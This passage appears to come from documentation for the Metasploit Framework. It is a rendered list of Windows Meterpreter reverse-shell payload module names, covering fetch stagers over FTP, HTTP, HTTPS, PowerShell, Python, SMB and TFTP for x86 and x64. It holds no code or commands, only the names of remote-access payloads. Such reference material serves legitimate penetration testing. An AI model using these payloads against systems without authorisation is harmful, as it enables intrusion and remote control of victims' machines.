+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>cmd/windows/ftp/x64/meterpreter/reverse_https
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>cmd/windows/ftp/x64/meterpreter/reverse_named_pipe
+<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>cmd/windows/ftp/x64/meterpreter/reverse_tcp
+<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>cmd/windows/ftp/x64/meterpreter/reverse_tcp_rc4
+<a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>cmd/windows/ftp/x64/meterpreter/reverse_tcp_uuid
+<a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a>cmd/windows/ftp/x64/meterpreter/reverse_winhttp
+<a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a>cmd/windows/ftp/x64/meterpreter/reverse_winhttps
+<a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a>cmd/windows/ftp/x64/meterpreter_reverse_http
+<a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a>cmd/windows/ftp/x64/meterpreter_reverse_https
+<a id="__codelineno-22-11" name="__codelineno-22-11" href="#__codelineno-22-11"></a>cmd/windows/ftp/x64/meterpreter_reverse_ipv6_tcp
+<a id="__codelineno-22-12" name="__codelineno-22-12" href="#__codelineno-22-12"></a>cmd/windows/ftp/x64/meterpreter_reverse_tcp
+<a id="__codelineno-22-13" name="__codelineno-22-13" href="#__codelineno-22-13"></a>cmd/windows/ftp/x86/meterpreter/reverse_http
+<a id="__codelineno-22-14" name="__codelineno-22-14" href="#__codelineno-22-14"></a>cmd/windows/ftp/x86/meterpreter/reverse_http_proxy_pstore
+<a id="__codelineno-22-15" name="__codelineno-22-15" href="#__codelineno-22-15"></a>cmd/windows/ftp/x86/meterpreter/reverse_https
+<a id="__codelineno-22-16" name="__codelineno-22-16" href="#__codelineno-22-16"></a>cmd/windows/ftp/x86/meterpreter/reverse_ipv6_tcp
+<a id="__codelineno-22-17" name="__codelineno-22-17" href="#__codelineno-22-17"></a>cmd/windows/ftp/x86/meterpreter/reverse_named_pipe
+<a id="__codelineno-22-18" name="__codelineno-22-18" href="#__codelineno-22-18"></a>cmd/windows/ftp/x86/meterpreter/reverse_nonx_tcp
+<a id="__codelineno-22-19" name="__codelineno-22-19" href="#__codelineno-22-19"></a>cmd/windows/ftp/x86/meterpreter/reverse_ord_tcp
+<a id="__codelineno-22-20" name="__codelineno-22-20" href="#__codelineno-22-20"></a>cmd/windows/ftp/x86/meterpreter/reverse_tcp
+<a id="__codelineno-22-21" name="__codelineno-22-21" href="#__codelineno-22-21"></a>cmd/windows/ftp/x86/meterpreter/reverse_tcp_allports
+<a id="__codelineno-22-22" name="__codelineno-22-22" href="#__codelineno-22-22"></a>cmd/windows/ftp/x86/meterpreter/reverse_tcp_dns
+<a id="__codelineno-22-23" name="__codelineno-22-23" href="#__codelineno-22-23"></a>cmd/windows/ftp/x86/meterpreter/reverse_tcp_rc4
+<a id="__codelineno-22-24" name="__codelineno-22-24" href="#__codelineno-22-24"></a>cmd/windows/ftp/x86/meterpreter/reverse_tcp_rc4_dns
+<a id="__codelineno-22-25" name="__codelineno-22-25" href="#__codelineno-22-25"></a>cmd/windows/ftp/x86/meterpreter/reverse_tcp_uuid
+<a id="__codelineno-22-26" name="__codelineno-22-26" href="#__codelineno-22-26"></a>cmd/windows/ftp/x86/meterpreter/reverse_winhttp
+<a id="__codelineno-22-27" name="__codelineno-22-27" href="#__codelineno-22-27"></a>cmd/windows/ftp/x86/meterpreter/reverse_winhttps
+<a id="__codelineno-22-28" name="__codelineno-22-28" href="#__codelineno-22-28"></a>cmd/windows/ftp/x86/meterpreter_reverse_http
+<a id="__codelineno-22-29" name="__codelineno-22-29" href="#__codelineno-22-29"></a>cmd/windows/ftp/x86/meterpreter_reverse_https
+<a id="__codelineno-22-30" name="__codelineno-22-30" href="#__codelineno-22-30"></a>cmd/windows/ftp/x86/meterpreter_reverse_ipv6_tcp
+<a id="__codelineno-22-31" name="__codelineno-22-31" href="#__codelineno-22-31"></a>cmd/windows/ftp/x86/meterpreter_reverse_tcp
+<a id="__codelineno-22-32" name="__codelineno-22-32" href="#__codelineno-22-32"></a>cmd/windows/ftp/x86/metsvc_reverse_tcp
+<a id="__codelineno-22-33" name="__codelineno-22-33" href="#__codelineno-22-33"></a>cmd/windows/ftp/x86/patchupmeterpreter/reverse_ipv6_tcp
+<a id="__codelineno-22-34" name="__codelineno-22-34" href="#__codelineno-22-34"></a>cmd/windows/ftp/x86/patchupmeterpreter/reverse_nonx_tcp
+<a id="__codelineno-22-35" name="__codelineno-22-35" href="#__codelineno-22-35"></a>cmd/windows/ftp/x86/patchupmeterpreter/reverse_ord_tcp
+<a id="__codelineno-22-36" name="__codelineno-22-36" href="#__codelineno-22-36"></a>cmd/windows/ftp/x86/patchupmeterpreter/reverse_tcp
+<a id="__codelineno-22-37" name="__codelineno-22-37" href="#__codelineno-22-37"></a>cmd/windows/ftp/x86/patchupmeterpreter/reverse_tcp_allports
+<a id="__codelineno-22-38" name="__codelineno-22-38" href="#__codelineno-22-38"></a>cmd/windows/ftp/x86/patchupmeterpreter/reverse_tcp_dns
+<a id="__codelineno-22-39" name="__codelineno-22-39" href="#__codelineno-22-39"></a>cmd/windows/ftp/x86/patchupmeterpreter/reverse_tcp_rc4
+<a id="__codelineno-22-40" name="__codelineno-22-40" href="#__codelineno-22-40"></a>cmd/windows/ftp/x86/patchupmeterpreter/reverse_tcp_rc4_dns
+<a id="__codelineno-22-41" name="__codelineno-22-41" href="#__codelineno-22-41"></a>cmd/windows/ftp/x86/patchupmeterpreter/reverse_tcp_uuid
+<a id="__codelineno-22-42" name="__codelineno-22-42" href="#__codelineno-22-42"></a>cmd/windows/http/x64/meterpreter/reverse_http
+<a id="__codelineno-22-43" name="__codelineno-22-43" href="#__codelineno-22-43"></a>cmd/windows/http/x64/meterpreter/reverse_https
+<a id="__codelineno-22-44" name="__codelineno-22-44" href="#__codelineno-22-44"></a>cmd/windows/http/x64/meterpreter/reverse_named_pipe
+<a id="__codelineno-22-45" name="__codelineno-22-45" href="#__codelineno-22-45"></a>cmd/windows/http/x64/meterpreter/reverse_tcp
+<a id="__codelineno-22-46" name="__codelineno-22-46" href="#__codelineno-22-46"></a>cmd/windows/http/x64/meterpreter/reverse_tcp_rc4
+<a id="__codelineno-22-47" name="__codelineno-22-47" href="#__codelineno-22-47"></a>cmd/windows/http/x64/meterpreter/reverse_tcp_uuid
+<a id="__codelineno-22-48" name="__codelineno-22-48" href="#__codelineno-22-48"></a>cmd/windows/http/x64/meterpreter/reverse_winhttp
+<a id="__codelineno-22-49" name="__codelineno-22-49" href="#__codelineno-22-49"></a>cmd/windows/http/x64/meterpreter/reverse_winhttps
+<a id="__codelineno-22-50" name="__codelineno-22-50" href="#__codelineno-22-50"></a>cmd/windows/http/x64/meterpreter_reverse_http
+<a id="__codelineno-22-51" name="__codelineno-22-51" href="#__codelineno-22-51"></a>cmd/windows/http/x64/meterpreter_reverse_https
+<a id="__codelineno-22-52" name="__codelineno-22-52" href="#__codelineno-22-52"></a>cmd/windows/http/x64/meterpreter_reverse_ipv6_tcp
+<a id="__codelineno-22-53" name="__codelineno-22-53" href="#__codelineno-22-53"></a>cmd/windows/http/x64/meterpreter_reverse_tcp
+<a id="__codelineno-22-54" name="__codelineno-22-54" href="#__codelineno-22-54"></a>cmd/windows/http/x86/meterpreter/reverse_http
+<a id="__codelineno-22-55" name="__codelineno-22-55" href="#__codelineno-22-55"></a>cmd/windows/http/x86/meterpreter/reverse_http_proxy_pstore
+<a id="__codelineno-22-56" name="__codelineno-22-56" href="#__codelineno-22-56"></a>cmd/windows/http/x86/meterpreter/reverse_https
+<a id="__codelineno-22-57" name="__codelineno-22-57" href="#__codelineno-22-57"></a>cmd/windows/http/x86/meterpreter/reverse_ipv6_tcp
+<a id="__codelineno-22-58" name="__codelineno-22-58" href="#__codelineno-22-58"></a>cmd/windows/http/x86/meterpreter/reverse_named_pipe
+<a id="__codelineno-22-59" name="__codelineno-22-59" href="#__codelineno-22-59"></a>cmd/windows/http/x86/meterpreter/reverse_nonx_tcp
+<a id="__codelineno-22-60" name="__codelineno-22-60" href="#__codelineno-22-60"></a>cmd/windows/http/x86/meterpreter/reverse_ord_tcp
+<a id="__codelineno-22-61" name="__codelineno-22-61" href="#__codelineno-22-61"></a>cmd/windows/http/x86/meterpreter/reverse_tcp
+<a id="__codelineno-22-62" name="__codelineno-22-62" href="#__codelineno-22-62"></a>cmd/windows/http/x86/meterpreter/reverse_tcp_allports
+<a id="__codelineno-22-63" name="__codelineno-22-63" href="#__codelineno-22-63"></a>cmd/windows/http/x86/meterpreter/reverse_tcp_dns
+<a id="__codelineno-22-64" name="__codelineno-22-64" href="#__codelineno-22-64"></a>cmd/windows/http/x86/meterpreter/reverse_tcp_rc4
+<a id="__codelineno-22-65" name="__codelineno-22-65" href="#__codelineno-22-65"></a>cmd/windows/http/x86/meterpreter/reverse_tcp_rc4_dns
+<a id="__codelineno-22-66" name="__codelineno-22-66" href="#__codelineno-22-66"></a>cmd/windows/http/x86/meterpreter/reverse_tcp_uuid
+<a id="__codelineno-22-67" name="__codelineno-22-67" href="#__codelineno-22-67"></a>cmd/windows/http/x86/meterpreter/reverse_winhttp
+<a id="__codelineno-22-68" name="__codelineno-22-68" href="#__codelineno-22-68"></a>cmd/windows/http/x86/meterpreter/reverse_winhttps
+<a id="__codelineno-22-69" name="__codelineno-22-69" href="#__codelineno-22-69"></a>cmd/windows/http/x86/meterpreter_reverse_http
+<a id="__codelineno-22-70" name="__codelineno-22-70" href="#__codelineno-22-70"></a>cmd/windows/http/x86/meterpreter_reverse_https
+<a id="__codelineno-22-71" name="__codelineno-22-71" href="#__codelineno-22-71"></a>cmd/windows/http/x86/meterpreter_reverse_ipv6_tcp
+<a id="__codelineno-22-72" name="__codelineno-22-72" href="#__codelineno-22-72"></a>cmd/windows/http/x86/meterpreter_reverse_tcp
+<a id="__codelineno-22-73" name="__codelineno-22-73" href="#__codelineno-22-73"></a>cmd/windows/http/x86/metsvc_reverse_tcp
+<a id="__codelineno-22-74" name="__codelineno-22-74" href="#__codelineno-22-74"></a>cmd/windows/http/x86/patchupmeterpreter/reverse_ipv6_tcp
+<a id="__codelineno-22-75" name="__codelineno-22-75" href="#__codelineno-22-75"></a>cmd/windows/http/x86/patchupmeterpreter/reverse_nonx_tcp
+<a id="__codelineno-22-76" name="__codelineno-22-76" href="#__codelineno-22-76"></a>cmd/windows/http/x86/patchupmeterpreter/reverse_ord_tcp
+<a id="__codelineno-22-77" name="__codelineno-22-77" href="#__codelineno-22-77"></a>cmd/windows/http/x86/patchupmeterpreter/reverse_tcp
+<a id="__codelineno-22-78" name="__codelineno-22-78" href="#__codelineno-22-78"></a>cmd/windows/http/x86/patchupmeterpreter/reverse_tcp_allports
+<a id="__codelineno-22-79" name="__codelineno-22-79" href="#__codelineno-22-79"></a>cmd/windows/http/x86/patchupmeterpreter/reverse_tcp_dns
+<a id="__codelineno-22-80" name="__codelineno-22-80" href="#__codelineno-22-80"></a>cmd/windows/http/x86/patchupmeterpreter/reverse_tcp_rc4
+<a id="__codelineno-22-81" name="__codelineno-22-81" href="#__codelineno-22-81"></a>cmd/windows/http/x86/patchupmeterpreter/reverse_tcp_rc4_dns
+<a id="__codelineno-22-82" name="__codelineno-22-82" href="#__codelineno-22-82"></a>cmd/windows/http/x86/patchupmeterpreter/reverse_tcp_uuid
+<a id="__codelineno-22-83" name="__codelineno-22-83" href="#__codelineno-22-83"></a>cmd/windows/https/x64/meterpreter/reverse_http
+<a id="__codelineno-22-84" name="__codelineno-22-84" href="#__codelineno-22-84"></a>cmd/windows/https/x64/meterpreter/reverse_https
+<a id="__codelineno-22-85" name="__codelineno-22-85" href="#__codelineno-22-85"></a>cmd/windows/https/x64/meterpreter/reverse_named_pipe
+<a id="__codelineno-22-86" name="__codelineno-22-86" href="#__codelineno-22-86"></a>cmd/windows/https/x64/meterpreter/reverse_tcp
+<a id="__codelineno-22-87" name="__codelineno-22-87" href="#__codelineno-22-87"></a>cmd/windows/https/x64/meterpreter/reverse_tcp_rc4
+<a id="__codelineno-22-88" name="__codelineno-22-88" href="#__codelineno-22-88"></a>cmd/windows/https/x64/meterpreter/reverse_tcp_uuid
+<a id="__codelineno-22-89" name="__codelineno-22-89" href="#__codelineno-22-89"></a>cmd/windows/https/x64/meterpreter/reverse_winhttp
+<a id="__codelineno-22-90" name="__codelineno-22-90" href="#__codelineno-22-90"></a>cmd/windows/https/x64/meterpreter/reverse_winhttps
+<a id="__codelineno-22-91" name="__codelineno-22-91" href="#__codelineno-22-91"></a>cmd/windows/https/x64/meterpreter_reverse_http
+<a id="__codelineno-22-92" name="__codelineno-22-92" href="#__codelineno-22-92"></a>cmd/windows/https/x64/meterpreter_reverse_https
+<a id="__codelineno-22-93" name="__codelineno-22-93" href="#__codelineno-22-93"></a>cmd/windows/https/x64/meterpreter_reverse_ipv6_tcp
+<a id="__codelineno-22-94" name="__codelineno-22-94" href="#__codelineno-22-94"></a>cmd/windows/https/x64/meterpreter_reverse_tcp
+<a id="__codelineno-22-95" name="__codelineno-22-95" href="#__codelineno-22-95"></a>cmd/windows/https/x86/meterpreter/reverse_http
+<a id="__codelineno-22-96" name="__codelineno-22-96" href="#__codelineno-22-96"></a>cmd/windows/https/x86/meterpreter/reverse_http_proxy_pstore
+<a id="__codelineno-22-97" name="__codelineno-22-97" href="#__codelineno-22-97"></a>cmd/windows/https/x86/meterpreter/reverse_https
+<a id="__codelineno-22-98" name="__codelineno-22-98" href="#__codelineno-22-98"></a>cmd/windows/https/x86/meterpreter/reverse_ipv6_tcp
+<a id="__codelineno-22-99" name="__codelineno-22-99" href="#__codelineno-22-99"></a>cmd/windows/https/x86/meterpreter/reverse_named_pipe
+<a id="__codelineno-22-100" name="__codelineno-22-100" href="#__codelineno-22-100"></a>cmd/windows/https/x86/meterpreter/reverse_nonx_tcp
+<a id="__codelineno-22-101" name="__codelineno-22-101" href="#__codelineno-22-101"></a>cmd/windows/https/x86/meterpreter/reverse_ord_tcp
+<a id="__codelineno-22-102" name="__codelineno-22-102" href="#__codelineno-22-102"></a>cmd/windows/https/x86/meterpreter/reverse_tcp
+<a id="__codelineno-22-103" name="__codelineno-22-103" href="#__codelineno-22-103"></a>cmd/windows/https/x86/meterpreter/reverse_tcp_allports
+<a id="__codelineno-22-104" name="__codelineno-22-104" href="#__codelineno-22-104"></a>cmd/windows/https/x86/meterpreter/reverse_tcp_dns
+<a id="__codelineno-22-105" name="__codelineno-22-105" href="#__codelineno-22-105"></a>cmd/windows/https/x86/meterpreter/reverse_tcp_rc4
+<a id="__codelineno-22-106" name="__codelineno-22-106" href="#__codelineno-22-106"></a>cmd/windows/https/x86/meterpreter/reverse_tcp_rc4_dns
+<a id="__codelineno-22-107" name="__codelineno-22-107" href="#__codelineno-22-107"></a>cmd/windows/https/x86/meterpreter/reverse_tcp_uuid
+<a id="__codelineno-22-108" name="__codelineno-22-108" href="#__codelineno-22-108"></a>cmd/windows/https/x86/meterpreter/reverse_winhttp
+<a id="__codelineno-22-109" name="__codelineno-22-109" href="#__codelineno-22-109"></a>cmd/windows/https/x86/meterpreter/reverse_winhttps
+<a id="__codelineno-22-110" name="__codelineno-22-110" href="#__codelineno-22-110"></a>cmd/windows/https/x86/meterpreter_reverse_http
+<a id="__codelineno-22-111" name="__codelineno-22-111" href="#__codelineno-22-111"></a>cmd/windows/https/x86/meterpreter_reverse_https
+<a id="__codelineno-22-112" name="__codelineno-22-112" href="#__codelineno-22-112"></a>cmd/windows/https/x86/meterpreter_reverse_ipv6_tcp
+<a id="__codelineno-22-113" name="__codelineno-22-113" href="#__codelineno-22-113"></a>cmd/windows/https/x86/meterpreter_reverse_tcp
+<a id="__codelineno-22-114" name="__codelineno-22-114" href="#__codelineno-22-114"></a>cmd/windows/https/x86/metsvc_reverse_tcp
+<a id="__codelineno-22-115" name="__codelineno-22-115" href="#__codelineno-22-115"></a>cmd/windows/https/x86/patchupmeterpreter/reverse_ipv6_tcp
+<a id="__codelineno-22-116" name="__codelineno-22-116" href="#__codelineno-22-116"></a>cmd/windows/https/x86/patchupmeterpreter/reverse_nonx_tcp
+<a id="__codelineno-22-117" name="__codelineno-22-117" href="#__codelineno-22-117"></a>cmd/windows/https/x86/patchupmeterpreter/reverse_ord_tcp
+<a id="__codelineno-22-118" name="__codelineno-22-118" href="#__codelineno-22-118"></a>cmd/windows/https/x86/patchupmeterpreter/reverse_tcp
+<a id="__codelineno-22-119" name="__codelineno-22-119" href="#__codelineno-22-119"></a>cmd/windows/https/x86/patchupmeterpreter/reverse_tcp_allports
+<a id="__codelineno-22-120" name="__codelineno-22-120" href="#__codelineno-22-120"></a>cmd/windows/https/x86/patchupmeterpreter/reverse_tcp_dns
+<a id="__codelineno-22-121" name="__codelineno-22-121" href="#__codelineno-22-121"></a>cmd/windows/https/x86/patchupmeterpreter/reverse_tcp_rc4
+<a id="__codelineno-22-122" name="__codelineno-22-122" href="#__codelineno-22-122"></a>cmd/windows/https/x86/patchupmeterpreter/reverse_tcp_rc4_dns
+<a id="__codelineno-22-123" name="__codelineno-22-123" href="#__codelineno-22-123"></a>cmd/windows/https/x86/patchupmeterpreter/reverse_tcp_uuid
+<a id="__codelineno-22-124" name="__codelineno-22-124" href="#__codelineno-22-124"></a>cmd/windows/powershell/meterpreter/reverse_http
+<a id="__codelineno-22-125" name="__codelineno-22-125" href="#__codelineno-22-125"></a>cmd/windows/powershell/meterpreter/reverse_http_proxy_pstore
+<a id="__codelineno-22-126" name="__codelineno-22-126" href="#__codelineno-22-126"></a>cmd/windows/powershell/meterpreter/reverse_https
+<a id="__codelineno-22-127" name="__codelineno-22-127" href="#__codelineno-22-127"></a>cmd/windows/powershell/meterpreter/reverse_ipv6_tcp
+<a id="__codelineno-22-128" name="__codelineno-22-128" href="#__codelineno-22-128"></a>cmd/windows/powershell/meterpreter/reverse_named_pipe
+<a id="__codelineno-22-129" name="__codelineno-22-129" href="#__codelineno-22-129"></a>cmd/windows/powershell/meterpreter/reverse_nonx_tcp
+<a id="__codelineno-22-130" name="__codelineno-22-130" href="#__codelineno-22-130"></a>cmd/windows/powershell/meterpreter/reverse_ord_tcp
+<a id="__codelineno-22-131" name="__codelineno-22-131" href="#__codelineno-22-131"></a>cmd/windows/powershell/meterpreter/reverse_tcp
+<a id="__codelineno-22-132" name="__codelineno-22-132" href="#__codelineno-22-132"></a>cmd/windows/powershell/meterpreter/reverse_tcp_allports
+<a id="__codelineno-22-133" name="__codelineno-22-133" href="#__codelineno-22-133"></a>cmd/windows/powershell/meterpreter/reverse_tcp_dns
+<a id="__codelineno-22-134" name="__codelineno-22-134" href="#__codelineno-22-134"></a>cmd/windows/powershell/meterpreter/reverse_tcp_rc4
+<a id="__codelineno-22-135" name="__codelineno-22-135" href="#__codelineno-22-135"></a>cmd/windows/powershell/meterpreter/reverse_tcp_rc4_dns
+<a id="__codelineno-22-136" name="__codelineno-22-136" href="#__codelineno-22-136"></a>cmd/windows/powershell/meterpreter/reverse_tcp_uuid
+<a id="__codelineno-22-137" name="__codelineno-22-137" href="#__codelineno-22-137"></a>cmd/windows/powershell/meterpreter/reverse_winhttp
+<a id="__codelineno-22-138" name="__codelineno-22-138" href="#__codelineno-22-138"></a>cmd/windows/powershell/meterpreter/reverse_winhttps
+<a id="__codelineno-22-139" name="__codelineno-22-139" href="#__codelineno-22-139"></a>cmd/windows/powershell/meterpreter_reverse_http
+<a id="__codelineno-22-140" name="__codelineno-22-140" href="#__codelineno-22-140"></a>cmd/windows/powershell/meterpreter_reverse_https
+<a id="__codelineno-22-141" name="__codelineno-22-141" href="#__codelineno-22-141"></a>cmd/windows/powershell/metsvc_reverse_tcp
+<a id="__codelineno-22-142" name="__codelineno-22-142" href="#__codelineno-22-142"></a>cmd/windows/powershell/patchupmeterpreter/reverse_ipv6_tcp
+<a id="__codelineno-22-143" name="__codelineno-22-143" href="#__codelineno-22-143"></a>cmd/windows/powershell/patchupmeterpreter/reverse_nonx_tcp
+<a id="__codelineno-22-144" name="__codelineno-22-144" href="#__codelineno-22-144"></a>cmd/windows/powershell/patchupmeterpreter/reverse_ord_tcp
+<a id="__codelineno-22-145" name="__codelineno-22-145" href="#__codelineno-22-145"></a>cmd/windows/powershell/patchupmeterpreter/reverse_tcp
+<a id="__codelineno-22-146" name="__codelineno-22-146" href="#__codelineno-22-146"></a>cmd/windows/powershell/patchupmeterpreter/reverse_tcp_allports
+<a id="__codelineno-22-147" name="__codelineno-22-147" href="#__codelineno-22-147"></a>cmd/windows/powershell/patchupmeterpreter/reverse_tcp_dns
+<a id="__codelineno-22-148" name="__codelineno-22-148" href="#__codelineno-22-148"></a>cmd/windows/powershell/patchupmeterpreter/reverse_tcp_rc4
+<a id="__codelineno-22-149" name="__codelineno-22-149" href="#__codelineno-22-149"></a>cmd/windows/powershell/patchupmeterpreter/reverse_tcp_rc4_dns
+<a id="__codelineno-22-150" name="__codelineno-22-150" href="#__codelineno-22-150"></a>cmd/windows/powershell/patchupmeterpreter/reverse_tcp_uuid
+<a id="__codelineno-22-151" name="__codelineno-22-151" href="#__codelineno-22-151"></a>cmd/windows/powershell/x64/meterpreter/reverse_http
+<a id="__codelineno-22-152" name="__codelineno-22-152" href="#__codelineno-22-152"></a>cmd/windows/powershell/x64/meterpreter/reverse_https
+<a id="__codelineno-22-153" name="__codelineno-22-153" href="#__codelineno-22-153"></a>cmd/windows/powershell/x64/meterpreter/reverse_named_pipe
+<a id="__codelineno-22-154" name="__codelineno-22-154" href="#__codelineno-22-154"></a>cmd/windows/powershell/x64/meterpreter/reverse_tcp
+<a id="__codelineno-22-155" name="__codelineno-22-155" href="#__codelineno-22-155"></a>cmd/windows/powershell/x64/meterpreter/reverse_tcp_rc4
+<a id="__codelineno-22-156" name="__codelineno-22-156" href="#__codelineno-22-156"></a>cmd/windows/powershell/x64/meterpreter/reverse_tcp_uuid
+<a id="__codelineno-22-157" name="__codelineno-22-157" href="#__codelineno-22-157"></a>cmd/windows/powershell/x64/meterpreter/reverse_winhttp
+<a id="__codelineno-22-158" name="__codelineno-22-158" href="#__codelineno-22-158"></a>cmd/windows/powershell/x64/meterpreter/reverse_winhttps
+<a id="__codelineno-22-159" name="__codelineno-22-159" href="#__codelineno-22-159"></a>cmd/windows/powershell/x64/meterpreter_reverse_http
+<a id="__codelineno-22-160" name="__codelineno-22-160" href="#__codelineno-22-160"></a>cmd/windows/powershell/x64/meterpreter_reverse_https
+<a id="__codelineno-22-161" name="__codelineno-22-161" href="#__codelineno-22-161"></a>cmd/windows/python/meterpreter/reverse_http
+<a id="__codelineno-22-162" name="__codelineno-22-162" href="#__codelineno-22-162"></a>cmd/windows/python/meterpreter/reverse_https
+<a id="__codelineno-22-163" name="__codelineno-22-163" href="#__codelineno-22-163"></a>cmd/windows/python/meterpreter/reverse_tcp
+<a id="__codelineno-22-164" name="__codelineno-22-164" href="#__codelineno-22-164"></a>cmd/windows/python/meterpreter/reverse_tcp_ssl
+<a id="__codelineno-22-165" name="__codelineno-22-165" href="#__codelineno-22-165"></a>cmd/windows/python/meterpreter/reverse_tcp_uuid
+<a id="__codelineno-22-166" name="__codelineno-22-166" href="#__codelineno-22-166"></a>cmd/windows/python/meterpreter_reverse_http
+<a id="__codelineno-22-167" name="__codelineno-22-167" href="#__codelineno-22-167"></a>cmd/windows/python/meterpreter_reverse_https
+<a id="__codelineno-22-168" name="__codelineno-22-168" href="#__codelineno-22-168"></a>cmd/windows/python/meterpreter_reverse_tcp
+<a id="__codelineno-22-169" name="__codelineno-22-169" href="#__codelineno-22-169"></a>cmd/windows/smb/x64/meterpreter/reverse_http
+<a id="__codelineno-22-170" name="__codelineno-22-170" href="#__codelineno-22-170"></a>cmd/windows/smb/x64/meterpreter/reverse_https
+<a id="__codelineno-22-171" name="__codelineno-22-171" href="#__codelineno-22-171"></a>cmd/windows/smb/x64/meterpreter/reverse_named_pipe
+<a id="__codelineno-22-172" name="__codelineno-22-172" href="#__codelineno-22-172"></a>cmd/windows/smb/x64/meterpreter/reverse_tcp
+<a id="__codelineno-22-173" name="__codelineno-22-173" href="#__codelineno-22-173"></a>cmd/windows/smb/x64/meterpreter/reverse_tcp_rc4
+<a id="__codelineno-22-174" name="__codelineno-22-174" href="#__codelineno-22-174"></a>cmd/windows/smb/x64/meterpreter/reverse_tcp_uuid
+<a id="__codelineno-22-175" name="__codelineno-22-175" href="#__codelineno-22-175"></a>cmd/windows/smb/x64/meterpreter/reverse_winhttp
+<a id="__codelineno-22-176" name="__codelineno-22-176" href="#__codelineno-22-176"></a>cmd/windows/smb/x64/meterpreter/reverse_winhttps
+<a id="__codelineno-22-177" name="__codelineno-22-177" href="#__codelineno-22-177"></a>cmd/windows/smb/x64/meterpreter_reverse_http
+<a id="__codelineno-22-178" name="__codelineno-22-178" href="#__codelineno-22-178"></a>cmd/windows/smb/x64/meterpreter_reverse_https
+<a id="__codelineno-22-179" name="__codelineno-22-179" href="#__codelineno-22-179"></a>cmd/windows/smb/x64/meterpreter_reverse_ipv6_tcp
+<a id="__codelineno-22-180" name="__codelineno-22-180" href="#__codelineno-22-180"></a>cmd/windows/smb/x64/meterpreter_reverse_tcp
+<a id="__codelineno-22-181" name="__codelineno-22-181" href="#__codelineno-22-181"></a>cmd/windows/tftp/x64/meterpreter/reverse_http
+<a id="__codelineno-22-182" name="__codelineno-22-182" href="#__codelineno-22-182"></a>cmd/windows/tftp/x64/meterpreter/reverse_https
+<a id="__codelineno-22-183" name="__codelineno-22-183" href="#__codelineno-22-183"></a>cmd/windows/tftp/x64/meterpreter/reverse_named_pipe
+<a id="__codelineno-22-184" name="__codelineno-22-184" href="#__codelineno-22-184"></a>cmd/windows/tftp/x64/meterpreter/reverse_tcp
+<a id="__codelineno-22-185" name="__codelineno-22-185" href="#__codelineno-22-185"></a>cmd/windows/tftp/x64/meterpreter/reverse_tcp_rc4
+<a id="__codelineno-22-186" name="__codelineno-22-186" href="#__codelineno-22-186"></a>cmd/windows/tftp/x64/meterpreter/reverse_tcp_uuid
+<a id="__codelineno-22-187" name="__codelineno-22-187" href="#__codelineno-22-187"></a>cmd/windows/tftp/x64/meterpreter/reverse_winhttp
+<a id="__codelineno-22-188" name="__codelineno-22-188" href="#__codelineno-22-188"></a>cmd/windows/tftp/x64/meterpreter/reverse_winhttps
+<a id="__codelineno-22-189" name="__codelineno-22-189" href="#__codelineno-22-189"></a>cmd/windows/tftp/x64/meterpreter_reverse_http
+<a id="__codelineno-22-190" name="__codelineno-22-190" href="#__codelineno-22-190"></a>cmd/windows/tftp/x64/meterpreter_reverse_https
+<a id="__codelineno-22-191" name="__codelineno-22-191" href="#__codelineno-22-191"></a>cmd/windows/tftp/x64/meterpreter_reverse_ipv6_tcp
+<a id="__codelineno-22-192" name="__codelineno-22-192" href="#__codelineno-22-192"></a>cmd/windows/tftp/x64/meterpreter_reverse_tcp
+<a id="__codelineno-22-193" name="__codelineno-22-193" href="#__codelineno-22-193"></a>windows/meterpreter/reverse_http
+<a id="__codelineno-22-194" name="__codelineno-22-194" href="#__codelineno-22-194"></a>windows/meterpreter/reverse_http_proxy_pstore
+<a id="__codelineno-22-195" name="__codelineno-22-195" href="#__codelineno-22-195"></a>windows/meterpreter/reverse_https
+<a id="__codelineno-22-196" name="__codelineno-22-196" href="#__codelineno-22-196"></a>windows/meterpreter/reverse_ipv6_tcp
+<a id="__codelineno-22-197" name="__codelineno-22-197" href="#__codelineno-22-197"></a>windows/meterpreter/reverse_named_pipe
+<a id="__codelineno-22-198" name="__codelineno-22-198" href="#__codelineno-22-198"></a>windows/meterpreter/reverse_nonx_tcp
+<a id="__codelineno-22-199" name="__codelineno-22-199" href="#__codelineno-22-199"></a>windows/meterpreter/reverse_ord_tcp
+<a id="__codelineno-22-200" name="__codelineno-22-200" href="#__codelineno-22-200"></a>windows/meterpreter/reverse_tcp
+<a id="__codelineno-22-201" name="__codelineno-22-201" href="#__codelineno-22-201"></a>windows/meterpreter/reverse_tcp_allports
+<a id="__codelineno-22-202" name="__codelineno-22-202" href="#__codelineno-22-202"></a>windows/meterpreter/reverse_tcp_dns
+<a id="__codelineno-22-203" name="__codelineno-22-203" href="#__codelineno-22-203"></a>windows/meterpreter/reverse_tcp_rc4
+<a id="__codelineno-22-204" name="__codelineno-22-204" href="#__codelineno-22-204"></a>windows/meterpreter/reverse_tcp_rc4_dns
+<a id="__codelineno-22-205" name="__codelineno-22-205" href="#__codelineno-22-205"></a>windows/meterpreter/reverse_tcp_uuid
+<a id="__codelineno-22-206" name="__codelineno-22-206" href="#__codelineno-22-206"></a>windows/meterpreter/reverse_winhttp
+<a id="__codelineno-22-207" name="__codelineno-22-207" href="#__codelineno-22-207"></a>windows/meterpreter/reverse_winhttps
+<a id="__codelineno-22-208" name="__codelineno-22-208" href="#__codelineno-22-208"></a>windows/meterpreter_reverse_http
+<a id="__codelineno-22-209" name="__codelineno-22-209" href="#__codelineno-22-209"></a>windows/meterpreter_reverse_https
+<a id="__codelineno-22-210" name="__codelineno-22-210" href="#__codelineno-22-210"></a>windows/meterpreter_reverse_ipv6_tcp
+<a id="__codelineno-22-211" name="__codelineno-22-211" href="#__codelineno-22-211"></a>windows/meterpreter_reverse_tcp
+<a id="__codelineno-22-212" name="__codelineno-22-212" href="#__codelineno-22-212"></a>windows/metsvc_reverse_tcp
